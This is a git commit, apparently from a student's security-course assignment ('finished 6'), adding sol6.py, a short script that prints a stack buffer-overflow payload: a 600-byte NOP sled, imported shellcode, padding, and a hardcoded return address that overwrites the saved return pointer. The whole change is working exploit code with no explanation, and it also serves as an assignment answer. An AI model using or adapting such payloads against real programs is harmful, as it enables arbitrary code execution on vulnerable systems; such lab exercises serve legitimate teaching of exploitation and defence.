d0f07eb256e9c4a88204a3d64289b696051434f1
yijo2004 <yijo@umich.edu>
2024-04-03 02:08:13 +0000

    finished 6

--- sol6.py
+++ sol6.py
@@ -3,3 +3,8 @@
 import sys
 
 from shellcode import shellcode
+
+sys.stdout.buffer.write(b'\x90'*(600))
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'\x00'*(1024-600-len(shellcode)+8))
+sys.stdout.buffer.write(0x7FFFFFF6923C.to_bytes(8,'little'))
